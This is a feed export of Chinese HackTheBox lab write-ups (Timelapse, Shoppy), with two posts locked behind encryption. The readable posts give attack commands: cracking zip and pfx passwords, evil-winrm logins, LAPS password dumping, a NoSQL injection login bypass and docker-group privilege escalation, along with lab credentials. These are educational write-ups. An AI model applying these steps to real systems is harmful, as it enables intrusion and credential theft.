0c1431026321862068a2f0d5beef79a8cf25610307c661e38d20441ee807964aa9cfb29024f7be495f02964664ec58093f739427cb0dc99acbb7bb7f7bc22da367f4943e5790f3813a0c8708c6958397a8ba70f127254afff623d3a71ace4f63d7a67a85cf86a9590a8f54a6e67351cb7f67bc05a87dbe05a78cd61d8982ac387c83612112e6a23b796d2c349ba1ecbaf1145daeb47dfee9618e639dd6721df209eb16624db83d3359fdc7c772886267ddb22d7e7f3952a91047123d3ac51004c4efea0e33bc28ac1940281d4de3e7da747ecdd268fa69291b91ccf34a3cdcfc392a79df23064be2585cea10e3db51914b162f5cfae4ca910fdbcd50af7e74d07299704afd281057a746529c7d2029055f33e8976da56a236d5646a91fb5f7937792389e81ed90a58b8eecd37beed9b88f3c825c4ebfb7e1f9a2d5ae836f51186bc7e7d438a93fdb25e87c8821a8636e118436214cb6052322b12631c2a5012b48d998d0fff1ba6e28c1c919359229782940a52a2964752f3e3666cb1216b8743bcc4dafa067cb865c9c008068e1db1758afd6d813f0dbd483fb4ffbc517c3b746efe3979a33294a2bf16bd6187e1d27d6773f68ac37f6159783882cc23e61d0768112ed1e67e1b2b15d1ffee744445e696c5f657c43d57d0cceb769e79f4aeab09221c1508cd2ca058759940e0f9bbd3eeda0eb935fb98969cf88b32b2bcc52363a15f27a00ddf38f8dc6fb43e809f5b39043e8b6c15bdf61d9fdc7d6405c913ac4256a861de105e91a4c350488f8d96897e152e6aa268efb2c8dbf50877c64de4b75016ac0b1a5bd949d5ae0f7fec6126de23c9c5cef2bcc5b2032b6968fb36c9b67b5e5062689a4c8db173a48308c2d6eb102c6d0ae6a7e7a6026c2c43fde6781e0ae3965123819b91ece70e28367d3144c0b14853015433307633d67d1d10d9d9812f6b9968256b8822ece815a545832b7168da61de63a0b02f3e8906d9e409d6892a7a02fe9a3db90679459a99b2117e09aae95ff7dd6e600af45c832abad8e8f1f440da42bbef25fb303b46611a98a772770d01b2f56a16191ed7dd88e345a9ba11dbd8a7e89225f552882d23af89b77d778aa77b83df59490fc77d6430ad09e4a5a8f003270eaab26093c0b98096441a2f2ee29025eb96972c8b9ffb27e5a96cf409aaf23f201f0295b4b14ccb2b3083322673983469d2f779fa0b251bc0cc82fbfcee44b52d75e9511864282e807e0e30d2837a51c7a79720f7dafbaa2debff18c43bf1210d806c749e88cd5a82a7500149cae527a2f8e1f9c86a01c969a8ec876a3feda6d1b00ccb4cec150f6759497ccafe07f892214982f2e3b251f75adcf0a7bb269e9a06dddf679a470c52fccc53b62e1f1a8fe8dfe7fcd3f24edf06c3d636d6a4e55024a5b7d3e79f84167fd02d927048c0f2a18bc6db42118e4c16fa8642344aed5807a41d6b341e0330ca9435744779e7745a85a96a6eb82fab6d36299e2c275502f32bab320e4afeaad824e7fd2699e8e63598b8f02083dc7d1523287f1d742438a10c3a9d74e41c3694c7a87e61225c99251e249650f00573e6656e638dd531af6350f063a8dfc33b84292e08bfc39774bf439f283d07a90365c6eeaac5b19bc7bd4427c19e232f2e06071774d5fdb15bbf51a4046c0dfa94ae37e393d634208a2d830c0a7c834e31628765aad8c330882b2d9608482e4eb2556ff41fcdf234b2dff3d1f870e5d3afb4af8a2780b3f39e5d5d232ebeab67415ae97acf644e23fd07a461bc08360e2855a2cf8d5598125a673506913a66c80648d9238b6c8b46ffb440b126de6b871cfb79dfa03102683f089ceb669d0fec0338374f0832a237b5723ac36aa17fc4882324eb1921b46789fec087d2132fb66b25129c93beb5e7d1f255962f63abec8e93328aa771242b3cfcf6bbc936d39c08780d30c59b96a44621f8cb4a8f2b51b4d9d1496dcc39e28dab31cae33ee22ab5f6723b8106579163e96dcb99d245aa1d1f96092f64d08bede6ada9eec7f586d9cc081edd33b6f79a0b74387d4725c9c06abca9e4998b77704a3359cff8f970f2307edfca9985f64096c1f6117754cbc72eba084547aa4d3e30f9f44a66fa3ff99620d44ab2e3a7896198aba8ad46d0651ae3e8b5ab87e434e9bf7fd9a9d5b412111778679c617353f7381c70e24869825ae814333d6c36e2a11d04bf0f80a7400efc953e9d76e8633182953f91f230a5cc13c5f78de107b4f89e47c1820e695d6239c3d59ebf047b56ecbafec0988c1ae9a79541aae9b12a99e60acab59254dcc5442974f7e1100d437dbe28d19cc34a62216239f9688132e76e228ba4df04d228ae8f46244907fc7a2e40d142f53bd626bea1372eeb4842362656417f2623be86c34706fd8c1dc894359b02dc6a5d2b2401515c10207c253f171a0cbafd9dd85d389d226158e2dd9a9e619c8406bab7eb114d0bfb1190c849c2e9c75e714c859e989825318119cfcbd3b14abd5768831e23d5d45f1d6b83c38d6de566dff0ceaed6373d3a6c5b8e8783d21ed4d9277f7bdddecc00802a0b52822f4281b0a04b2bb215760085e52ce4919a82f7025582c8d82dc1fc875ac7b1b24601da05256242610cf490f630c6e8fa91b5dcd373830ae13a6a3c220ea58fefeb7f80c66089eb4d23c16103c2bf91eb73002af2497ce98c8fd3408a2770e3d91576d42ca717061fcf9926fe5d0268ec02fcaac8b13739d27688b7a6c8f90d83d14f4793c8a0ef195af6bdba3f66727a9ffe7320567ef6205494f8e257e439548bda0394d3a4b1ce770cae42079dd5b478008d15c6a280ac7f1e7def0b4a2f9578acf201a7d9ad99922d0fe0dda9de55341edf739935fe6171bc6e32804667916ff3d2606063db85d665cd8cf2cf0425c4b5cb47c2027ecd38c35005dd1f321e5cd7a17c7c407f8794bcd17f7a83d242f3202d30cf165706d36d50ac74a5c2b368c30065f67a83f55be847f039b6e542b1117eeeecb4c464d8bd5184aa832bee36edfe6ebf7bb32d377958a47c0cc3d39ca3a0d92ce9a4951f516d3bfe31c84fe5376b0e06f57f9870067ff2f85860b0d5accc1dbc5518ce12a71235b657f4d19afb05167290b5ba49c636b87b3e2f8ee25f5e4d03025af32d9459b0916c1714ab46abe26cf09271c6ca0cc29f966eb5699297000511a08737901993da05458b5c44ba71537b3330f1acf605ab26402bf4837f32cf89a1e83fe18ffd66e4be199abb3091e8a23b558610125c857e993fc203997acf9c47061983567486d861b9cb9f0e23ddf64c85c82ed62ab814db0476ec02eef43df10f073cb208eceb514fa0c07c3055f12aaf5045fed3b68b8bff69c0a37355f850b340e0223ec01ec6443a096addfeb7a7798e52c442a36f273f89aa66e84e9984ac5836416ee8dee147b210d3a12ca033c3c21c3423e992d3be172e2418b7adc7d2cb5cd48172d5bc7b60b61b7bb981e1ea28e4a7b8d73981648ba2f9adcde65881bdd23cc2d751a359e32f2a027adea3189ac61beb0b648149e9e6883a5aadb0e8e335351fe822aa00524d9e7dc899c657c48df64a1dba328545b0694f2c991ed374ccb8ae42a562b50e9f84d1f9378880955e8e01bed3a5c219d8a133c6e25b7b918ed739ea8925d80a45cf911186a60b19fef3d0ab82d63700d52f625600a1cbf836e4dacdd611c53c597bfb6d4d81835dcf6244670f5a3a508ecd5e0947e8050f6173b29875db3522237249c12c3c657a8110d433976212c806df9e140dfc23837cb5b7fd8b2f8b711b3060321313946cc85dd9f87a22caf4da0de1857f190d02c9c1d1e77acd7b7901a1f38c0861da837fa3e1c576607b0e584854829129608e5bb432af0706387343463204ec305a4ea2a41d85c957039d7886467e64278444cf70948d5974a6f105c9b69fe5ed79bdc6352d0fd6822d1f1c067d213029667cf749339020c53eac55c64e9dbf8b418ccb1eeada573b15b86f7e8337f9731198baf3da98a13fe31bc41f8ac489275e8caae23d3b9a5707444d6f8396c54f5aa5c5a4114d76edd34a9c336177783570ff0ec2dd1055399ab25ff2a464686465000e9bb41b5b6beee74144b0152f13a9e3b448686937b3b16ec3bea1e6ae067ff603c864f913c3f5964e71a9a25d9ffa1135feacd3a578b6f27d218c7672b96fcda3fd2fafff1146804353a4701c2a73f0ec4b80881b938891c8fa2ed298dc56470c48296a9731bcaedf21bded4474e8605559264eed95552b4d64b863e6a5acc52583a010f1432c69865234444b1f7ce890fb87de84e3db345bc3ec8703270ef268706e01089829ba341c8a1c9e061fd7f1bd745190e4acb48d0d4e87a4f317931b7d820c1de5d2ff4c41ac659ec6c6b5e412d6366e735092141ff11ef271f74d9ad59dda50c7766e9118f411c5b3126827e858eb2678744090641e4a3e7612317b65f9864193be3ba5eaea3b3f0a1ee30478d0a149f51ad139a7f13c7fc4c876956929b4903db55a8e2c43cd8661b4f163bac18d6ccc37118e9d59a3ae9b96e345ff307ab280aab8b64654bd2c0d01d1ebf6efc5a903cce9aa9e7eeee376bc47d929ec909cba55a37b26f52f6e270e26d471335da0ec84cfaf8196d3ea971c0eb13cb0c3787f3c53e18d341353f51e8fe1388a8d8a48b39762f292573830f8c9a745b61c11419eb81a0118473da4f816a601c1986d1c33326cd6c6407a8ef0a4e71fb4b6fcd63eb1e99bf0ba8ccbb5a47bb85851ff0b73f77c6b3c81e2c9f4e6a8657813a21596c702c888c7bbdf2095b47997afa78a332b163e818fba1b23b645fcc745dd80b5e660d97c8c58ed7a637225a2cc7898b11f48ab956a589b6975ec3de8c175ab1ad3f1a7464865235bda705e290c9547d121bbc892c31e5852f1875d515eafecfcd96e953fdfff6318269158c8b271538d2553513aa7964480e405080554b75e2a791c6808b0638744f454d20b976806e58265492f9ca8227267a2a268ce26ba53525ee0d1f2477d5204dd2f35bf3947dcbf86617604839f90305052d2474ef8b3381f38eda368ba0468bd3f38708a0ece39c32025df3c391027157fabf3b962d25d94c7a72e9ba199137cba729492161701003727fede9d242ba57951a4949f0499b389287b835c8e49a1b80bd26c9da7d93987f56cd9571ed75eb7613ea340da755c123b8b5ca2e1c2ad564ee1d611c1dce0b9fe17d5439d1f312ae477d81eba221f90bff594627548da21b9517af74202ff6d270dec32eba6c73b6b863b00f353b8df6ca12dba3400b8754322e8f88ee3ea70390bf9e1853cf3cbeeda87601b193dd70ddb3a96640d4e05411fd9b8b5272282537493d4e5f4769eab6417b545c15a9ea854c124609fd80e23059038f9d31b3484420d02f2885b9317e5117d75bb441d66c876ee100d752676b6a92dfc20ce80135d6968c6eb93bc2fbb9c2f7f482945278b1d90cb6c19b8a49c215a2a11332d65334db3302032cc0a6b23cec05e3f10187eb541602d08686a62c3e538187923cc5cd3f1b6f9ba93ab15325c21535ac43ee27be99c8a8a1dfac46dd779fef6505ba93fa7ad2f1521efaedf2b681a18570fc343979a2e12ce66bbe0a696bf60f25f11cd271d7a8b534b71ffff9c62cd74367accb881ff017f6260f733806dd9906411d9ab6465c2b7244c6a90d6bb9f0a4e4f624092183d9608415be26f17915a903599d6de69e4e56f05d88090cb1450803c5cff98d3bf0e3c4643252ebaf1c6f5a6b3951d7bc789cf8fd25cc3976a6ba391f1da37d7f6e45e3ff48b247b61bfdaacab2ff659406206d8ad5f40ffd25c12e5cfc61ade1a27a9f791cf4d3429956d77b4b7756cd11d66df2b8787eda9a971caf7ac118780f77d38712e3a098a76a9745d5c163086a2613e9da19fc5f3fe9ba498c2c49c1d3d24d3f2eff3818439289548f0cfcae2af9d232c0534ad876c12f765dbe297d7212fca3eb0e68daab21fccbc4651e4c825b92c03ae3e160dfb18d38932dbb1f96e298b06a315609d9ce4aa1240c3ea3e9434351492db93614d66675a2e3e104c9dc561686a077bc86a782da3cd5c47d3ec779cfbd97b1c5fc31c887e5423fdaabab542613ddca163a406860c2106cbd29a187610f6037f44c82b0a592d55f20426f5bbeb2a19914f5760bced7c7434ee441187dbc3a69ec780a16db989158eb007ea7fc83e306fb260c737fd8040a169d79fab33d09b8eaf5bb77605f9f04d34308a1d7a4d26b595d2b0a5bc4fc9dba592803a95b8080a73f9d151ba4fcc3b0efdba46957b482738ee3d232730eb670147728c6d181973dbd0b0714795788d937dc676214d9b707bb8753a053d83a1d3ca6422c2088e8213c7964f71efd0a57c8af7d5cf42e368da313aa423eaedf80162205b1fbb7f5d338d2f06c76e16026dd451ea05250aa2d254c3678a32bdc05dee4d650334cbde70c9901afc421cf61e18c2bf9943cb5d5016adba7f48e2b6bdd5103cede5c1b51469fd359510e72b7453abefef7319b852e948e4e50b03bbb225c1661f7103f107533bb25bd5817aa3f083ebd25235b35e0f21f3ccf4498589c54f978f1ed74327e22ea8a27141de6e796dedf30119515d35d42a9b1f718a614ab7ceb948e093c5a46c2216038a6496e1e5334e339879958654c8121078e8e162e6a24a768ab1f8b0f</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>htb</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>htb Timelapse复盘</title>
    <url>/2024/04/08/htb-Timelapse%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>继续记录靶机，学习📑</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>官方wp</p>
<p><a class="link"   href="https://developer.aliyun.com/article/1160921" >https://developer.aliyun.com/article/1160921<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://mp.weixin.qq.com/s/W6g0liTaOFJWFAMJGBwr4A" >https://mp.weixin.qq.com/s/W6g0liTaOFJWFAMJGBwr4A<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap  -p- --min-rate=1000 -T4 -A 10.10.11.152</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2023.12.54.png" ></p>
<p>开了挺多端口的，可以猜测这台靶机是个域控</p>
<p>用CrackMapExec对smb扫描，看看有什么共享资源</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.11.152 --shares -u xxx -p &#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408233932.png" ></p>
<p>有一个shares目录，用smbclient进行读取文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -N //10.10.11.152/shares</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409000951.png" ></p>
<p>Dev目录下有个压缩包，get到本地</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409001044.png" ></p>
<h4 id="爆破拿到密钥"><a href="#爆破拿到密钥" class="headerlink" title="爆破拿到密钥"></a>爆破拿到密钥</h4><p>发现需要密码，里面有个.pfx文件</p>
<blockquote>
<p>PFX 文件是一种用于存储和传输加密的数字证书的文件格式。它通常包含了证书、私钥和可选的证书链，所有这些内容都被加密并存储在一个文件中。PFX 文件通常使用密码进行保护，以确保只有授权的用户可以访问其中的私钥和证书。</p>
</blockquote>
<p>先用john看看能不能爆破zip密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip2john winrm_backup.zip &gt; ziphash</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409002050.png" ></p>
<p>拿到密码解压，成功拿到pfx文件，需要从里面导出密钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out pfx.key</span><br></pre></td></tr></table></figure>

<p>也需要密码，再用john爆破(发现john不能用root运行，我还以为哪里出错了。。。)</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409002849.png" ></p>
<p>拿到密码继续到处key</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out pfx.key</span><br><span class="line"># -nocerts 选项告诉 OpenSSL 不要提取证书，只提取私钥。</span><br><span class="line"># pfx.key 是输出私钥的文件名。</span><br><span class="line">openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out pfx.crt</span><br><span class="line"># -clcerts 选项告诉 OpenSSL 只提取客户端证书（不包括中间证书），如果 PFX 文件中包含中间证书链，则中间证书将不会被提取。</span><br><span class="line"># -nokeys 选项告诉 OpenSSL 不要提取私钥。</span><br><span class="line"># pfx.crt 是输出证书的文件名。</span><br></pre></td></tr></table></figure>

<p>还提示要给key文件设置密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409003016.png" ></p>
<p>然后拿这两个文件用evil-winrm连接到主机，输入的密码是刚刚自己设置的那个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.152 -S -c pfx.crt -k pfx.key</span><br></pre></td></tr></table></figure>

<p>cd到C:\Users\legacyy\desktop，拿到user.txt</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>查看powershell历史命令记录文件</p>
<blockquote>
<p>这个在应急响应中，检查windows主机，可以查看一下这个目录。</p>
<p>C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine</p>
</blockquote>
<p>里面有ConsoleHost_history.txt文件，拿到一个新的账号密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2000.37.50.png" ></p>
<p>再用evil-winrm登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.152 -u svc_deploy -p E3R$Q62^12p7PLlC%KWaxuaV -S</span><br></pre></td></tr></table></figure>

<p><code>-S</code>: 启用安全模式，使用 SSL 加密连接。这意味着连接将通过 HTTPS 加密进行，提供更安全的通信。</p>
<p>没有-S失败了好几次。。。</p>
<p>使用net user svc_deploy</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2000.52.07.png"   style="zoom:50%;" >

<blockquote>
<p>“Local Administrator Password Solution” (LAPS) is used to manage local account passwords of</p>
<p>Active Directory computers. </p>
</blockquote>
<p>LAPS_Readers这个分组说明 svc_deploy 有权从 LAPS进行读取</p>
<p>使用laps.py脚本导出域账号密码，需要绑定域名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/n00py/LAPSDumper</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409005529.png" ></p>
<p>成功拿到管理员密码，evil-winrm登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i timelapse.htb -S -u Administrator -p &#x27;[ej6W8oU!8b;V3&#125;0obNE[!&#123;#&#x27;</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409005712.png" ></p>
<h5 id="读取密码的第二种方式"><a href="#读取密码的第二种方式" class="headerlink" title="读取密码的第二种方式"></a>读取密码的第二种方式</h5><p>使用这个命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ADComputer DC01 -property &#x27;ms-mcs-admpwd&#x27;</span><br></pre></td></tr></table></figure>

<p><code>Get-ADComputer</code> 是一个 PowerShell cmdlet，用于获取 Active Directory 中计算机对象的信息。<code>-property &#39;ms-mcs-admpwd&#39;</code> 参数指定要返回的属性，其中 <code>&#39;ms-mcs-admpwd&#39;</code> 是计算机对象属性的名称。</p>
<p>这个命令的作用是获取名为 “DC01” 的计算机对象的 “ms-mcs-admpwd” 属性的值。这个属性通常用于存储 LAPS（Local Administrator Password Solution）生成的本地管理员账户的密码。 LAPS 是一种 Microsoft 提供的工具，用于管理 Windows 计算机的本地管理员密码，并确保每台计算机上的密码是唯一且定期更改的。</p>
<p>执行这个命令后，你将得到名为 “DC01” 的计算机对象的 “ms-mcs-admpwd” 属性的值，即本地管理员密码。</p>
<p>（来自ai的解释）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2000.58.57.png" ></p>
<p>也能读到密码</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>整体思路：CrackMapExec发现smb有共享资源–&gt;拿到压缩包–&gt;一系列爆破解密登陆第一个账户–&gt;历史命令文件中发现另一个账户账号密码–&gt;发现LAPS读取权限–&gt;管理员密码读取</p>
<p>涉及知识点：pfx文件，smbclient拿到共享资源，windows历史命令文件位置，LAPS服务</p>
<p>思路不算难，写完复盘也是对windows多了解了一些🙋‍♀️</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-UnderPass笔记</title>
    <url>/2024/12/25/htb-UnderPass%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="31069613ed6f56c2977732cedfad45ca543de974e39e7d7df8521fea0484cc6d"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>htb</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>htb Shoppy复盘</title>
    <url>/2024/09/13/htb-Shoppy%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─# nmap -A -p- --min-rate=1000 -T4 10.10.11.180</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-12 22:56 PDT</span><br><span class="line">Nmap scan report for shoppy.htb (10.10.11.180)</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)</span><br><span class="line">|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)</span><br><span class="line">|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)</span><br><span class="line">80/tcp   open  http     nginx 1.23.1</span><br><span class="line">|_http-title:             Shoppy Wait Page        </span><br><span class="line">|_http-server-header: nginx/1.23.1</span><br><span class="line">9093/tcp open  copycat?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">。。。。</span><br><span class="line">OS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R</span><br><span class="line">OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%</span><br><span class="line">OS:RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 53/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   407.75 ms 10.10.16.1</span><br><span class="line">2   407.83 ms shoppy.htb (10.10.11.180)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 235.39 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>开了三个端口，9093端口访问后看起来像是配置文件，没找到什么有用的东西（后来看别的wp说这能看出这台机器有mattermost服务）</p>
<p>有个域名 <code>shoppy.htb</code>，扫子域名扫到mattermost，都添加到hosts里，mattermost这个域名需要账号密码登陆</p>
<p>shoppy.htb这个扫目录扫到登陆口&#x2F;login，然后看官方对这个机器的介绍是存在Nosql注入</p>
<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><blockquote>
<p>Nosql注入介绍以及payload</p>
<p><a class="link"   href="https://nullsweep.com/a-nosql-injection-primer-with-mongo/" >https://nullsweep.com/a-nosql-injection-primer-with-mongo/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/9908?time__1311=n4+xnD0DuDRDci730=D/iaRmxjhhIWDRxD5t4+Qx" >https://xz.aliyun.com/t/9908?time__1311=n4%2BxnD0DuDRDci730%3DD%2FiaRmxjhhIWDRxD5t4%2BQx<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://book.hacktricks.xyz/v/cn/pentesting-web/nosql-injection#sql-mongo" >https://book.hacktricks.xyz/v/cn/pentesting-web/nosql-injection#sql-mongo<i class="fas fa-external-link-alt"></i></a></p>
</blockquote>
<p>是通过什么判断为Nosql注入的呢？（参考思路：<a class="link"   href="https://arz101.medium.com/hackthebox-shoppy-64cbe52964ed" >https://arz101.medium.com/hackthebox-shoppy-64cbe52964ed<i class="fas fa-external-link-alt"></i></a> ）</p>
<p>login发包是post发送username和password两个参数，按往常那样测试单引号，每次都需等待很久的时间然后返回504，直接sqlmap跑也无效，当我们随便访问一个不存在的目录时返回的是，这表明这个web在使用路由</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913140659.png" ></p>
<p>所以可能是在使用Node.js，他存在使用Nosql注入漏洞绕过登陆限制，经过尝试，可以使用<code>admin&#39; || &#39;a&#39;==&#39;a</code>绕过</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913141054.png" ></p>
<p>登陆后跳转到&#x2F;admin，主要是有个search功能点，没找到别的点了，搜索admin，给了一个json文件，里面有admin密码的哈希（爆破不出来）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913141517.png" ></p>
<p>但是不知道有没有别的用户，继续使用Nosql的payload<code>admin&#39; || &#39;a&#39;==&#39;a</code>，这次多看到一个用户的密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913141635.png" ></p>
<p>爆破后拿到账号密码<code>josh:remembermethisway</code>，成功登陆mattermost那个域名的登陆口，在聊天窗口中找到jaeger的账号密码，ssh登陆成功，拿到user</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913141843.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>sudo -l看到 <code>(deploy) /home/deploy/password-manager</code>,password-manager是个二进制文件，strings查看，貌似是输入正确的密码后能拿到deploy目录下的creds.txt</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913142207.png" ></p>
<p>传到本地，ida看了一下，密码就在源代码里，<code>Sample</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913142251.png" ></p>
<p>输入正确密码后拿到deploy的密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913142327.png" ></p>
<p>登陆deploy输入id，发现deploy在docker组里，有相关的提权方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy@shoppy:/home/jaeger$ id</span><br><span class="line">uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>docker提权参考链接</p>
<p><a class="link"   href="https://www.cnblogs.com/kqdssheng/p/18275541" >https://www.cnblogs.com/kqdssheng/p/18275541<i class="fas fa-external-link-alt"></i></a></p>
</blockquote>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240913142636.png" ></p>
<p>有个docker提权的漏洞，大概思路就是<strong>创建一个新的容器，该容器中挂载了整个文件系统。在这个容器中，我将是根用户，因此可以完全访问容器中的所有文件（包括完整的主机文件系统）。</strong></p>
<p>​	•	docker run: 运行一个新的 Docker 容器。</p>
<p>​	•	-v &#x2F;:&#x2F;mnt: 将宿主机的根目录 &#x2F; 挂载到容器内部的 &#x2F;mnt 目录。这样，容器可以通过 &#x2F;mnt 访问到宿主机的文件系统。</p>
<p>​	•	–rm: 容器在退出后会自动删除，不会保留临时文件或容器。</p>
<p>​	•	-it: 以交互模式运行容器，并分配一个伪终端。这样你可以在容器中运行命令并看到输出。</p>
<p>​	•	alpine: 指定使用 Alpine Linux 这个小型的 Linux 发行版镜像作为容器的基础镜像。</p>
<p>​	•	chroot &#x2F;mnt: 使用 chroot 命令将 &#x2F;mnt 作为新的根目录，将容器的根文件系统切换到宿主机的根目录。</p>
<p>​	•	bash: 运行 bash，给你一个新的 shell 环境。</p>
